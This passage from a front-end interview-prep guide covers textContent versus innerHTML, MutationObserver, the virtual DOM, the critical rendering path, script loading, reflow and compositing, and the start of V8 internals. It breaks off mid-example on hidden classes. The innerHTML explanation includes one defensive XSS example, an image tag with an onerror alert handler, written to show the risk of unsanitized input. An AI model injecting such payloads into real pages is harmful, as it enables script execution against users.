- **`defer`** — download in parallel, execute *after* parsing completes, in order. Best default for scripts that need the DOM.
- **`async`** — download in parallel, execute as soon as ready (order not guaranteed). For independent scripts (analytics).
- **`type="module"`** — deferred by default.

The senior habit: never put render-blocking synchronous scripts in `<head>` without `defer`/`async`.

### Q12. What's the difference between `textContent`, `innerText`, and `innerHTML`? Which is safe?

```javascript
el.textContent = userInput; // sets raw text; no HTML parsing → XSS-SAFE, fast
el.innerHTML  = userInput;  // PARSES as HTML → executes markup → XSS RISK
el.innerText;               // rendered text — triggers reflow, respects CSS visibility
```

- **`textContent`** — gets/sets the raw text of all descendant text nodes. Doesn't parse HTML, doesn't force layout, ignores styling. **Use this for untrusted content** — it's XSS-safe because `<script>` becomes literal text.
- **`innerHTML`** — serializes to / parses from an HTML string. Powerful but **dangerous with user input**: `el.innerHTML = '<img src=x onerror=alert(1)>'` executes. Only use with trusted or sanitized content.
- **`innerText`** — like textContent but reflects *rendered* text (respects `display:none`, triggers a reflow to compute visibility). Slower; rarely what you want programmatically.

The security rule (cross-ref Browser Security / the Security primer): **default to `textContent`; use `innerHTML` only with sanitized input**, ideally via a sanitizer or Trusted Types.

### Q13. What is the difference between the DOM in DevTools and "View Source"?

**View Source** shows the **original HTML bytes** the server sent — the raw text before parsing, before any JS runs. The **DevTools Elements panel** shows the **live DOM tree** as it currently exists — after the parser's fix-ups and after every JS mutation.

They differ whenever:
- The parser corrected invalid markup (added `<tbody>`, closed tags).
- JavaScript added/removed/changed nodes after load (SPA content, hydration, dynamic lists).
- Framework-rendered content: View Source of a client-rendered SPA often shows an near-empty `<div id="root">`, while Elements shows the full rendered tree.

This is a practical, revealing question: it confirms you understand that the DOM is *derived and mutable*, not the source. It's also why "the page is empty in View Source" is normal for CSR apps and matters for SEO — a preview of the rendering-strategies (CSR vs SSR) topic.

### Q14. How would you observe DOM changes without polling?

Use a **`MutationObserver`** — it asynchronously notifies you when nodes are added/removed, attributes change, or text changes, batching mutations into microtask-timed callbacks (no polling, no layout thrash):

```javascript
const observer = new MutationObserver((mutations) => {
  for (const m of mutations) {
    if (m.type === 'childList') handleAddedNodes(m.addedNodes);
  }
});
observer.observe(targetNode, { childList: true, subtree: true, attributes: true });
// later: observer.disconnect();  // ALWAYS clean up to avoid leaks
```

Use cases: reacting to third-party/CMS DOM injection, auto-enhancing dynamically added elements, detecting when a node you need appears. Related observers worth naming: **IntersectionObserver** (element enters viewport — powers lazy-loading and infinite scroll) and **ResizeObserver** (element size changes). All three replace expensive `scroll`/`resize`/`setInterval` polling with efficient, batched callbacks. Remember to `disconnect()` — a live observer holding node references is a **memory leak** (a runtime-performance topic).

### Q15. What is the "virtual DOM" and is it part of the browser?

**No — the virtual DOM is not a browser concept.** It's a **library technique** (React popularized it) where the framework keeps a lightweight JavaScript-object *description* of what the UI should look like. On a state change it builds a new description, **diffs** it against the previous one, and computes the **minimal set of real DOM mutations** to apply. The goal is to avoid manual, error-prone imperative DOM code and to batch/minimize the expensive real-DOM operations from Q7.

Framing for an interview (framework-agnostic): the real DOM is the expensive resource; a virtual DOM is one strategy for *minimizing writes* to it. It's not automatically faster than hand-tuned direct DOM code — the win is developer ergonomics plus "good enough" batching. Other frameworks skip it entirely: Svelte compiles to direct DOM updates, and fine-grained-reactivity libraries (Solid, Vue's reactivity) update precise nodes without a diff. So the virtual DOM is *a* solution to "DOM mutation is costly," not *the* solution, and definitely not something the browser provides.

### Q16. You append 10,000 rows and the page freezes. Diagnose and fix.

Two problems compound: (1) building/inserting 10k nodes does a lot of main-thread work and reflow; (2) even done efficiently, rendering 10k nodes is expensive for the browser to lay out and paint, and holds memory.

Diagnosis path: is the freeze in *construction* (JS building/attaching nodes — profile the long task) or in *rendering* (layout/paint of a huge tree)? Usually both.

Fixes, in order of impact:
- **Don't render 10k nodes at all — virtualize/window.** Render only the ~30 rows in the viewport plus a buffer, recycling nodes as the user scrolls (react-window, TanStack Virtual, or hand-rolled with IntersectionObserver). This is the real fix; the DOM should hold what's visible.
- If you must insert many, **batch with a `DocumentFragment`** (Q9) and insert once.
- **Chunk the work** across frames (`requestAnimationFrame` or `scheduler.postTask`) so you don't block one long task — yield to keep the page responsive.
- Consider **`content-visibility: auto`** to let the browser skip layout/paint of off-screen content.

The headline answer interviewers want: **windowing.** The best DOM operation is the one you don't do — keep the tree small. This is the DOM entry point to list virtualization in the runtime-performance topic.

## The Critical Rendering Path

### Summary

**What this topic covers**

The exact sequence of steps the browser runs to turn your HTML, CSS, and JavaScript into pixels — and, more importantly, what *blocks* each step so you can make the first paint happen sooner. The **Critical Rendering Path (CRP)** is the pipeline: parse **HTML → DOM**, parse **CSS → CSSOM**, combine **DOM + CSSOM → render tree**, run **layout (reflow)** to compute geometry, **paint** to record pixels per layer, and **composite** the layers on the GPU into the frame you see. This topic explains *why* **CSS is render-blocking**, *why* a synchronous `<script>` is **parser-blocking**, how **`defer`/`async`/`module`** change script timing, and what levers get pixels on screen faster (minimizing critical resources, inlining critical CSS, deferring JS). Per the primer's stance, CSS appears here only as a **browser mechanism** (CSSOM, render-blocking, reflow) — not as a styling tutorial. The 16 questions walk from "name the steps" to "diagnose why first paint is slow and fix it."

**Mental model**

Think of the CRP as an assembly line with two feeder tracks that must *both* finish before assembly starts. Track one: HTML streams in and the parser builds the **DOM**. Track two: CSS is fetched and parsed into the **CSSOM**. The browser won't build the **render tree** — and therefore won't paint anything meaningful — until it has *both* a DOM and a CSSOM, because it can't know what a node looks like (or whether it's even visible) without the computed styles. That's the crux of "**CSS is render-blocking**": an unstyled flash is considered worse than a short delay, so the browser waits for CSS before first paint. Layered on top: a synchronous `<script>` can *pause* DOM construction (it might change the DOM), and because scripts can read styles, a script will also *wait* for pending CSS above it. So the two feeder tracks interfere. The senior mental move: identify the **critical resources** (the HTML, the render-blocking CSS, any parser-blocking JS) on the path to first paint, and shrink/defer/parallelize them. Everything else — images, below-the-fold content, non-critical JS — should get out of the way of that first frame.

**Key terms**

- **Critical Rendering Path (CRP)** — the full sequence from bytes to pixels: DOM, CSSOM, render tree, layout, paint, composite.
- **DOM** — object tree from HTML (previous topic).
- **CSSOM** — object tree the browser builds from CSS; holds computed style rules. Render-blocking to construct.
- **Render tree** — DOM ∩ CSSOM: only the nodes that will be *rendered* (excludes `display:none` and non-visual nodes like `<head>`).
- **Layout / reflow** — computing the geometry (position + size) of every render-tree node. Triggered by DOM/style/size changes.
- **Paint** — filling in pixels: colors, text, borders, shadows — recorded as draw commands, grouped into layers.
- **Composite** — assembling painted layers (with transforms/opacity) into the final frame, done on the GPU.
- **Render-blocking** — CSS: the browser won't do first meaningful paint until render-blocking CSS is parsed.
- **Parser-blocking** — a synchronous `<script>` that halts DOM construction until it downloads and executes.
- **`defer`** — download in parallel, run after parsing, in order — non-blocking, DOM-ready.
- **`async`** — download in parallel, run ASAP, unordered — non-blocking, for independent scripts.
- **Preload scanner** — a secondary parser that scans ahead for resources to start downloads early, even while blocked.
- **Critical CSS** — the minimal CSS needed to style above-the-fold content, inlined to avoid a blocking round-trip.

**Why interviewers ask this**

The CRP is the single best test of whether you can reason about **loading performance** from first principles rather than cargo-culting "put scripts at the bottom." A junior recites "HTML, CSS, JS." A senior can say *why* CSS blocks rendering (no FOUC), *why* a `<script>` in `<head>` without `defer` delays first paint (parser-blocking + waits for prior CSS), and *what they'd measure* (FCP, LCP) and change (inline critical CSS, `defer` scripts, preconnect, reduce critical bytes). It's also the foundation for **Core Web Vitals** work — you can't improve **LCP** or eliminate render-blocking resources if you don't know the path. Interviewers love the follow-up "your first paint is 4 seconds, walk me through diagnosing it" because it forces you to map real tools (Lighthouse, the Performance panel, the network waterfall) onto this mental model. Get the CRP right and most loading-performance questions answer themselves.

**Common confusions**

- "JS is render-blocking" — more precisely, a *synchronous* `<script>` is **parser-blocking** (halts DOM construction). CSS is what's classically **render-blocking**. `defer`/`async` scripts are neither.
- "The browser paints as soon as it has the DOM" — no; it waits for the **CSSOM** too, because it needs computed styles to build the render tree.
- "Reflow and repaint are the same" — layout/reflow recomputes *geometry*; paint/repaint refills *pixels*. A color change repaints without reflow; a size change reflows *and* repaints.
- "`display:none` and `visibility:hidden` are equivalent" — `display:none` removes the node from the **render tree** (no layout, no paint, no space); `visibility:hidden` keeps it in the tree, laid out and occupying space, just not painted.
- "Putting scripts at the end of `<body>` is the same as `defer`" — nearly, but `defer` starts the download *earlier* (during parsing) and still runs before `DOMContentLoaded` in order; end-of-body scripts download late.
- "Async makes scripts run in order" — `async` is *unordered*; whichever downloads first runs first. Use `defer` when order matters.

**What follows from this topic**

The CRP is the backbone of the whole performance half of the primer. "What blocks first paint" flows into **Core Web Vitals** (FCP, LCP) and **loading performance** (resource hints, code splitting, critical CSS). "Layout → paint → composite" and "reflow vs repaint" flow into **runtime performance** (layout thrashing, GPU-composited animations, 60fps). The parser-blocking/`defer`/`async` material connects back to **HTML & the DOM** (how scripts pause parsing) and forward to **rendering strategies** (SSR gives HTML the browser can paint before JS arrives, sidestepping a CSR blank screen). Master the path once and you have the map for nearly every "make it faster" question.

### Q1. Walk me through the critical rendering path from response to pixels.

The pipeline, in order:

```
HTML bytes ──► DOM  ─┐
                     ├─► Render Tree ──► Layout ──► Paint ──► Composite ──► PIXELS
CSS bytes  ──► CSSOM ┘        (visible        (geometry)  (fill        (GPU
                              nodes only)                  pixels)      layers)
```

1. **HTML → DOM** — parser builds the object tree, incrementally, as bytes arrive.
2. **CSS → CSSOM** — CSS is fetched and parsed into a style tree. **Render-blocking**: the browser won't paint meaningfully until this is ready.
3. **Render tree** — DOM combined with CSSOM, keeping only *rendered* nodes (drops `<head>`, `display:none`).
4. **Layout (reflow)** — compute each node's exact position and size (geometry) given the viewport.
5. **Paint** — record draw commands (text, colors, borders) into paint layers.
6. **Composite** — the GPU assembles the layers, applying transforms/opacity, into the final frame.

The two things worth flagging as you narrate it: **CSS blocks the render tree** (so it blocks first paint), and a **synchronous script can block DOM construction**. Everything about loading performance is shortening this path to first paint. LCP/FCP measure the payoff (Core Web Vitals topic).

### Q2. What is the CSSOM and why must the browser build it before painting?

The **CSSOM (CSS Object Model)** is the tree the browser builds by parsing all CSS — inline, `<style>`, and external `<link>` stylesheets — resolving the cascade, inheritance, and specificity into a structure of computed style rules. It's the styling counterpart to the DOM.

The browser needs it before painting because **it can't build the render tree without computed styles.** To decide whether a node is even visible (`display:none` → excluded), what size and color it is, and how it stacks, the browser must have resolved styles. Painting the DOM without the CSSOM would mean either an unstyled flash (FOUC) or repainting once styles arrive — both worse than briefly waiting.

This is *why CSS is render-blocking*: CSSOM construction gates the render tree, and the render tree gates paint. The optimization that follows: **minimize and prioritize CSS on the critical path** — inline critical CSS, load non-critical CSS non-blocking (`media` queries, `preload`+swap), and keep the stylesheet small.

### Q3. Why is CSS render-blocking, and how do you reduce its cost without giving up styling?

**Why:** the browser needs a complete **CSSOM** to build the render tree, and it treats a **flash of unstyled content (FOUC)** as worse than a small delay — so it withholds first meaningful paint until render-blocking CSS is parsed. CSS is also *not* incremental the way HTML is: a later rule can override an earlier one (the cascade), so the browser generally needs the whole stylesheet before it can safely compute final styles.

**Reduce the cost (as a browser mechanism, not styling advice):**
- **Inline critical CSS** — put the minimal above-the-fold styles directly in `<head>` so first paint needs no extra round-trip; load the rest asynchronously.
- **Split by media** — `<link rel="stylesheet" href="print.css" media="print">` is *not* render-blocking for screen rendering.
- **Load non-critical CSS non-blocking** — `rel="preload" as="style"` then swap to `stylesheet`, or `media="print"` onload swap.
- **Reduce bytes** — remove unused CSS, minify, compress (br/gzip). Fewer critical bytes = faster CSSOM.

The goal: shrink the render-blocking CSS on the path to first paint; defer everything else.

### Q4. Distinguish parser-blocking from render-blocking. Which applies to CSS vs JS?

Two different blocks, often conflated:

- **Render-blocking (CSS)** — the resource must be processed before the browser will do **first meaningful paint**. CSS is the classic render-blocking resource: no CSSOM, no render tree, no paint.
- **Parser-blocking (synchronous JS)** — the resource halts **DOM construction** while it downloads and executes, because a script can mutate the DOM (`document.write`) or read it. A plain `<script src>` in the middle of the body stops the parser until it finishes.

```html
<link rel="stylesheet" href="app.css">  <!-- render-blocking: delays first paint -->
<script src="app.js"></script>          <!-- parser-blocking: halts DOM construction -->
<script defer src="app.js"></script>    <!-- neither: parses in parallel, runs after DOM -->
```

A subtlety worth stating: a synchronous script *also* waits for any **pending CSS above it** to finish (because it might read computed styles via `getComputedStyle`), so CSS in `<head>` can indirectly delay your scripts too. The cure for both: `defer`/`async` your JS and keep critical CSS lean.

### Q5. Compare `defer`, `async`, and default `<script>`. When do you use each?

```html
<script src="a.js"></script>              <!-- default: parser-blocking -->
<script async src="analytics.js"></script><!-- download parallel, run ASAP, unordered -->
<script defer src="app.js"></script>      <!-- download parallel, run after parse, in order -->
<script type="module" src="app.mjs"></script> <!-- deferred by default -->
```

| Attribute | Blocks parser? | Download | Execution timing | Order preserved? |
|---|---|---|---|---|
| (none) | **Yes** | when reached | immediately, blocks parse | in document order |
| `async` | No | parallel | as soon as downloaded | **No** (race) |
| `defer` | No | parallel | after DOM parsed, before `DOMContentLoaded` | **Yes** |
| `type="module"` | No | parallel | deferred (like defer) | Yes |

When to use:
- **`defer`** — your app/framework scripts that need the DOM and depend on order. The sensible default.
- **`async`** — independent, order-agnostic scripts: analytics, ads, third-party widgets.
- **Default (no attr)** — rarely; only tiny inline config that must run before subsequent parsing, or when a later inline script depends on it synchronously.

The senior line: "`defer` everything app-related; `async` the independent third-party stuff; never leave a heavy render-blocking script in `<head>`."

### Q6. What is the render tree and how does it differ from the DOM?

The **render tree** is the combination of the DOM and the CSSOM, containing **only the nodes that will actually be rendered**, each annotated with its computed styles. It's what layout and paint operate on.

Differences from the DOM:
- **Non-visual nodes are excluded** — `<head>`, `<meta>`, `<script>`, `<title>` aren't in the render tree.
- **`display:none` nodes are excluded** — they produce no box, so they're absent (no geometry, no paint, no space).
- **Pseudo-elements are included** — `::before`/`::after` with content exist in the render tree but not the DOM.
- **Each node carries computed style** — the render tree knows color/size/visibility; the DOM alone doesn't.

Key contrast for interviews: **`display:none`** removes a node from the render tree entirely, while **`visibility:hidden`** keeps it (it's laid out and occupies space, just not painted). That's why toggling `display` triggers layout, but toggling `visibility` only repaints.

### Q7. Reflow vs repaint vs composite — define each and give a trigger for each.

Three stages of the back half of the pipeline, in increasing cheapness:

| Stage | What it does | Example trigger | Cost |
|---|---|---|---|
| **Reflow (layout)** | Recompute geometry (position/size) of nodes | Changing `width`, `height`, `top`, font-size, adding DOM nodes, reading `offsetHeight` | Most expensive — can cascade to the whole subtree |
| **Repaint** | Refill pixels without changing geometry | Changing `color`, `background`, `box-shadow`, `visibility` | Medium — repaints affected layers |
| **Composite** | Reassemble existing painted layers on the GPU | Changing `transform`, `opacity` (on a promoted layer) | Cheapest — no layout, no paint, GPU-only |

The performance rule this yields: **animate `transform` and `opacity`, not `width`/`top`/`left`.** Transform/opacity changes can be handled by the compositor thread + GPU, skipping main-thread layout and paint entirely — which is why they hit 60fps under load, while animating layout properties janks. A reflow always forces a subsequent repaint and composite; a repaint forces a composite; a composite-only change is nearly free. This is the bridge into runtime performance.

### Q8. Your First Contentful Paint is 4 seconds. Walk me through diagnosing it.

Systematic approach, mapping tools onto the CRP:

1. **Open the network waterfall / Lighthouse.** Look for **render-blocking resources** flagged — usually blocking CSS and synchronous scripts in `<head>`.
2. **Check TTFB** — if the server took 2s to send the first byte, no front-end CRP fix helps; that's a backend/CDN/cache problem (cross-ref Networking).
3. **Count critical resources and bytes** — how many render-blocking CSS/JS files sit between the HTML and first paint? How big?
4. **Check for parser-blocking scripts** — a synchronous `<script>` in `<head>` delays DOM construction *and* waits for prior CSS.
5. **Look at the Performance panel** — where does the first paint marker fall, and what's on the main thread before it (long parse? big CSSOM? script execution)?

Fixes in priority order: fix TTFB (caching/CDN); **inline critical CSS** and defer the rest; **`defer`/`async` scripts**; **preconnect/preload** critical origins and fonts; reduce/compress critical bytes; remove unused CSS. Always **measure before and after** (Lighthouse lab + field/RUM). The framing interviewers want: "find what's on the critical path to first paint, then shrink or defer it."

### Q9. What is the preload scanner and why does it matter?

While the main parser is **blocked** (e.g. on a synchronous script), the browser runs a secondary, lightweight **preload scanner** that skims ahead through the raw HTML looking for resources — `<img>`, `<link>`, `<script src>` — and **starts downloading them early**, in parallel, before the parser formally reaches them. It's a pure performance optimization: it keeps the network busy during parser stalls.

Why it matters to you:
- It's *why* even a parser-blocking script doesn't fully serialize all downloads — subsequent resources still get discovered and fetched.
- It only sees resources in the **static HTML**. Resources injected by JavaScript (e.g. `new Image().src = ...`, dynamically added `<link>`) are **invisible** to it and download late — a reason to keep critical resources in the initial HTML or use explicit **`<link rel="preload">`** hints so the scanner finds them.

Practical takeaway: put critical resource references in the initial HTML (or preload them) so the scanner can start them ASAP; don't hide your LCP image behind JS.

### Q10. Where do web fonts fit in the critical path, and how do you stop them causing layout shift or invisible text?

Fonts are a subtle CRP hazard because text can't paint (or paints wrong) until the font is available, and swapping fonts can shift layout:

- **FOIT (Flash of Invisible Text)** — the browser hides text while the font downloads; a slow font = blank text hurting FCP/LCP.
- **FOUT (Flash of Unstyled Text)** — text shows in a fallback font, then swaps to the web font, causing a reflow / **CLS** if metrics differ.

Controls:
- **`font-display: swap`** — show fallback immediately, swap when ready (favor FCP; risk of shift). `optional` avoids the swap-shift entirely on slow connections.
- **`<link rel="preload" as="font" crossorigin>`** — start the font download early so it's ready near first paint.
- **`size-adjust` / fallback font metrics** (`ascent-override`, etc.) — match the fallback's metrics to the web font so the swap doesn't shift layout (kills font-related CLS).
- **Self-host + subset** — avoid a third-party connection round-trip and ship only needed glyphs.

This is a favorite because it touches CRP (render-blocking-ish behavior), LCP (text paint), and CLS (layout shift) at once.

### Q11. Does CSS block JavaScript execution? Explain the interaction.

Yes, indirectly. A **synchronous `<script>` waits for any pending CSS *above it* to finish loading and parsing** before it executes. The reason: a script might call `getComputedStyle(el)` or read layout, and the browser can't return correct style/geometry until the CSSOM is complete. So the browser blocks script execution behind CSSOM construction to guarantee the script sees accurate styles.

```html
<link rel="stylesheet" href="slow.css">  <!-- takes 2s -->
<script>
  // This does NOT run until slow.css is downloaded and the CSSOM is built,
  // even though the script itself is tiny — it might read computed styles.
  console.log(getComputedStyle(document.body).color);
</script>
```

Consequences: a slow stylesheet in `<head>` can delay your inline scripts, not just first paint. This is another argument for lean critical CSS and for `defer`ring scripts (a deferred script runs after parsing anyway, so it's less entangled). It's a classic "gotcha" question that separates people who've actually profiled loading from those who've only read that "CSS is render-blocking."

### Q12. How do `display:none`, `visibility:hidden`, and `opacity:0` differ in the rendering pipeline?

All three hide an element, but they hit different pipeline stages — which is exactly why they perform differently:

| Property | In render tree? | Takes up space (layout)? | Painted? | Cost to toggle |
|---|---|---|---|---|
| `display:none` | **No** | No | No | Reflow (node enters/leaves layout) |
| `visibility:hidden` | Yes | **Yes** | No | Repaint only (geometry unchanged) |
| `opacity:0` | Yes | Yes | Yes (fully transparent) | Composite only (if on its own layer) |

Implications:
- **`display:none`** fully removes the box — toggling it forces **layout**. Cheapest memory/paint when hidden, most expensive to toggle.
- **`visibility:hidden`** keeps the box laid out (still occupies space) but skips painting — toggling is a **repaint**, no reflow.
- **`opacity:0`** still paints and can be **composited**; animating opacity is GPU-cheap, and the element still receives layout and (unless `pointer-events:none`) can be interactive.

This maps hiding techniques onto reflow/repaint/composite — a neat way to show you understand the pipeline, not just the CSS.

### Q13. What does it mean to "promote an element to its own layer," and what's the tradeoff?

The compositor can handle certain elements as **separate layers**, so changes to them (moving, fading via `transform`/`opacity`) are done by re-compositing on the **GPU** without re-running **layout or paint** on the main thread. You hint the browser to promote a layer with **`will-change: transform`** (or historically the `translateZ(0)` "hack"), and the browser also auto-promotes layers for certain content (video, canvas, animated transforms).

The win: **smooth, main-thread-independent animations** — a promoted element animating transform/opacity stays at 60fps even if JS is busy.

The tradeoff — **layer explosion**: each layer consumes GPU memory and adds compositing overhead. Promoting hundreds of elements (or slapping `will-change` on everything) can *hurt* performance and blow memory, especially on mobile. Rules: promote only the few elements you're actively animating, remove `will-change` when the animation ends, and measure layer count in DevTools' Layers panel. It's a scalpel, not a global setting — a good senior-nuance answer.

### Q14. Compare optimizing the loading path vs the runtime path — which CRP stages does each target?

Two distinct performance problems, both mapped onto the CRP:

- **Loading performance** targets the **front** of the path — getting to *first* paint fast. Levers: reduce **render-blocking CSS** (inline critical CSS), **`defer`/`async` JS**, **preconnect/preload**, shrink critical bytes, optimize TTFB, code-split so the initial bundle is small. Metrics: **FCP, LCP, TTFB**.
- **Runtime performance** targets the **repeated** back of the path — staying smooth *after* load as the user interacts. Levers: avoid **layout thrashing** (batch reads/writes), animate **transform/opacity** (composite, not reflow), break up **long tasks**, virtualize lists, debounce/throttle. Metrics: **INP, frame rate (60fps), long tasks**.

The unifying idea: loading optimization shortens the *first* trip through the pipeline; runtime optimization keeps *subsequent* trips (reflow → paint → composite per frame) under the 16.6ms budget. A strong candidate names which stage a given fix targets — e.g. "inlining critical CSS is a *loading* fix at the CSSOM stage; using `transform` for animation is a *runtime* fix at the composite stage." Both are unpacked in the two web-performance topics.

### Q15. What gets pixels on screen faster — list the highest-leverage CRP optimizations.

Ordered by typical impact:

1. **Cut render-blocking resources.** Inline **critical CSS** for above-the-fold; load the rest async. **`defer`/`async`** all non-critical scripts, and get synchronous scripts out of `<head>`.
2. **Reduce critical bytes.** Minify + compress (**brotli/gzip**) CSS/JS; remove unused CSS; **code-split** so the initial bundle only has what first paint needs.
3. **Start critical fetches early.** `rel="preconnect"`/`dns-prefetch` for third-party origins; `rel="preload"` for the LCP image, hero font, and critical CSS the preload scanner might miss.
4. **Optimize the LCP element.** Don't lazy-load the hero image; serve it in a modern format (AVIF/WebP) with correct dimensions; consider `fetchpriority="high"`.
5. **Improve TTFB.** CDN, edge caching, server-side caching — fix the server before blaming the front end.
6. **Avoid layout shift.** Reserve space for images/ads (width/height or `aspect-ratio`) so late-loading content doesn't shove the page (CLS).

The meta-point: **shorten the critical path (fewer/smaller blocking resources), start critical work sooner (hints), and don't block first paint with JS.** Then measure with Lighthouse + field data.

### Q16. How does server-side rendering change the critical rendering path compared to a client-rendered SPA?

A **client-rendered SPA (CSR)** ships a near-empty HTML shell plus a big JS bundle. The CRP to *meaningful* content is long: parse the shell (blank), download + parse + execute JS, *then* JS builds the DOM, *then* layout/paint. First contentful paint waits on JavaScript — a blank screen until the bundle runs.

**Server-side rendering (SSR)** sends fully-formed HTML for the initial view. The browser can run the normal CRP — DOM from real HTML, CSSOM, render tree, paint — and show content **before any app JS executes**. That's a much faster FCP/LCP. The cost is **hydration**: the JS still downloads and runs to attach event handlers and reconcile state onto the server HTML, and until hydration finishes the page can look ready but not be fully interactive (an INP/TTI gap).

CRP framing: SSR **removes JavaScript from the critical path to first paint** (HTML paints directly) but adds hydration work afterward; CSR **puts JS squarely on the critical path** to first paint. This is the doorway to the rendering-strategies topic (CSR vs SSR vs SSG vs ISR, streaming, islands) and connects to the hydration-cost discussion.
## The JavaScript Engine

### Summary

**What this topic covers**

What actually happens between "the browser downloaded a `.js` file" and "your function ran fast." This topic is the guts of V8 (Chrome/Edge/Node) — with JavaScriptCore (Safari) and SpiderMonkey (Firefox) as close cousins — and the runtime data structures every front-end performance discussion silently assumes. Three concern areas: (1) the **compilation pipeline** — source → parse → AST → **bytecode** (the Ignition interpreter) → **JIT-optimized machine code** (the TurboFan/Sparkplug tier) and the **deoptimizations** that throw that work away; (2) the **object model that makes JS fast or slow** — **hidden classes / shapes** and **inline caches**, and why consistent object shapes and monomorphic call sites matter more than any micro-optimization; and (3) the **memory model** — the **call stack**, the **heap**, and **garbage collection** (generational, mark-and-sweep, the stop-the-world pauses that cause jank). The 16 questions here connect these internals to code you actually write: why a hot loop deopts, why `delete` is slow, why a leak grows the heap until GC can't help. This is the layer beneath [[the-event-loop-async-js]] and [[javascript-language-internals]].

**Mental model**

JS is not "interpreted" or "compiled" — it's **both, adaptively**. Think of V8 as a factory with two workers. The fast-to-start worker (Ignition) reads your bytecode and just runs it, line by line, immediately — no warmup, but not blazing. Meanwhile a profiler watches which functions run **hot** (called many times, loops that iterate a lot). Hot functions get handed to the optimizing worker (TurboFan), which makes **speculative assumptions** — "this parameter has always been a small integer, this object has always had shape X" — and compiles specialized machine code that's often 10-100x faster. The catch: if an assumption breaks (you suddenly pass a string, or mutate the object's shape), V8 must **deoptimize** — bail back to bytecode, discard the optimized code, and possibly re-optimize later. So the engine rewards **predictability**: same types, same object shapes, same code paths. The second mental shift: memory is automatic but not free. Objects live on the **heap**; the GC periodically walks reachable objects from roots (the stack, globals) and reclaims the rest. Anything still reachable is *kept*, even if you'll never use it again — that's every memory leak.

**Key terms**

- **Ignition** — V8's bytecode interpreter; runs code immediately with no warmup, and collects type feedback.
- **TurboFan** — V8's optimizing JIT compiler; produces fast machine code from hot functions using speculative type assumptions. (Sparkplug is a fast non-optimizing baseline compiler between them.)
- **AST (Abstract Syntax Tree)** — the tree produced by parsing source; bytecode is generated from it.
- **JIT (Just-In-Time) compilation** — compiling to native code *at runtime*, guided by profiling, rather than ahead of time.
- **Deoptimization (deopt)** — bailing out of optimized machine code back to the interpreter when a speculative assumption is violated.
- **Hidden class / shape / map** — V8's internal descriptor of an object's structure (which properties, in which order, at which memory offsets). Objects with identical structure share one hidden class.
- **Inline cache (IC)** — a per-call-site cache remembering which hidden class(es) were seen, so property access skips the lookup. **Monomorphic** (1 shape) is fastest; **polymorphic** (2-4) is slower; **megamorphic** (many) falls back to a slow generic lookup.
- **Call stack** — the LIFO stack of function call frames; overflowing it (unbounded recursion) throws `RangeError: Maximum call stack size exceeded`.
- **Heap** — the region where objects, closures, and arrays are allocated; managed by the GC.
- **Generational GC** — splits the heap into a small **young/nursery** (fast, frequent minor GC via scavenging) and an **old** generation (infrequent major GC), exploiting that most objects die young.
- **Mark-and-sweep / mark-compact** — the major-GC algorithm: mark everything reachable from roots, sweep (reclaim) the rest, compact to reduce fragmentation.
- **Stop-the-world** — GC phases that pause JS execution; long pauses show up as dropped frames.

**Why interviewers ask this**

It separates people who *use* JS from people who *understand* it. A junior treats the engine as a black box: "JS is slow" or "JS is single-threaded and that's it." A senior can explain *why* a specific loop got slow — "the array went from packed-integers to holey-doubles, so element access deopted" — and fix it by keeping types stable. The strongest signal is the ability to reason about **speculation and deoptimization**: knowing that adding a property in a different order, or mixing types in an array, or using `arguments`, has a real cost. GC questions probe whether you understand that "the language has GC" is not the same as "you can't leak" — every senior has debugged a heap that grew until the tab crashed. You don't need to have written a JIT; you need to reason about the engine's incentives and connect them to Core Web Vitals (a stop-the-world pause is an INP problem).

**Common confusions**

- "JS is interpreted." — Modern JS is JIT-compiled adaptively; hot code runs as optimized native machine code, not interpreted bytecode.
- "The JIT always makes things faster." — Optimization can be *thrown away*. A polymorphic or deopting hot path can be slower than if it had stayed in the interpreter, plus you pay the compile cost.
- "Object property order doesn't matter." — For hidden classes it does: `{a, b}` and `{b, a}` are *different* shapes, so building objects in inconsistent order defeats inline caches.
- "`delete obj.x` just removes a property." — It mutates the hidden class into a slower "dictionary/deopted" mode; prefer setting to `null`/`undefined` on hot objects.
- "Garbage collection means no memory leaks." — GC reclaims *unreachable* memory. A forgotten timer, listener, or closure keeps objects reachable forever — that's a leak the GC will never fix.
- "The stack and heap are the same." — Primitives and frames live on the fixed-size stack; objects/closures live on the heap. Stack overflow and heap-out-of-memory are different failures.

**What follows from this topic**

The call stack here *is* the call stack in [[the-event-loop-async-js]] — the event loop only pulls the next task when the stack is empty, and a stop-the-world GC pause blocks it. Closures (a heap-allocation and a leak vector here) are dissected as a language feature in [[javascript-language-internals]]. Everything about hidden classes and deopts feeds runtime web performance: a janky scroll is often a hot handler that deopted or a GC pause. When you profile the DevTools Performance panel and see "Minor GC" sawteeth or long yellow "Scripting" bars, this is the topic that explains them.

### Q1. Is JavaScript interpreted or compiled?

Both, adaptively — this is the "trick question" warm-up. Modern engines like V8 use a **tiered JIT**:

1. Source is **parsed** into an **AST**.
2. The AST is compiled to **bytecode**, which the **Ignition** interpreter executes immediately (fast startup, collects type feedback).
3. Functions that run **hot** are handed to optimizing compilers (**Sparkplug** baseline, then **TurboFan**) that emit specialized **native machine code**.

So there's no ahead-of-time binary like C, but hot code absolutely runs as compiled machine code, not line-by-line interpretation. The right answer in an interview: "JavaScript is JIT-compiled — interpreted first for fast startup, then compiled to optimized native code for hot paths, with the ability to deoptimize back."

### Q2. Walk me through what V8 does from source text to running code.

```text
 source (.js)
    │  parse (lazy — outer functions parsed eagerly, inner deferred)
    ▼
   AST  ──► bytecode ──► Ignition (interpreter runs it, gathers type feedback)
                             │  function gets "hot"
                             ▼
                        Sparkplug (fast baseline machine code)
                             │  still hot + stable types
                             ▼
                        TurboFan (optimized machine code, speculative)
                             │  assumption violated
                             ▼
                        DEOPT ──► back to bytecode/Ignition
```

Key points to hit: **lazy parsing** (V8 skips fully parsing functions you never call, to cut startup cost — a reason huge bundles are slow to *parse*, not just download); **type feedback** collected by the interpreter drives what TurboFan can assume; and optimization is **speculative and reversible**. The whole design optimizes for "start fast, get faster where it matters."

### Q3. What are hidden classes (shapes) and why do they matter for performance?

JS objects are dynamic, but V8 makes property access fast by giving each object a **hidden class** (aka "shape" or "map") — an internal descriptor listing which properties exist, in what order, and at what memory offset. Objects created the same way share one hidden class, so V8 can access `obj.x` by a fixed offset instead of a hash lookup.

```javascript
function Point(x, y) {
  this.x = x;   // transitions to hidden class C1 (has x)
  this.y = y;   // transitions to C2 (has x, y)
}
const a = new Point(1, 2); // shape C2
const b = new Point(3, 4); // shape C2 — shared! fast

const c = new Point(5, 6);
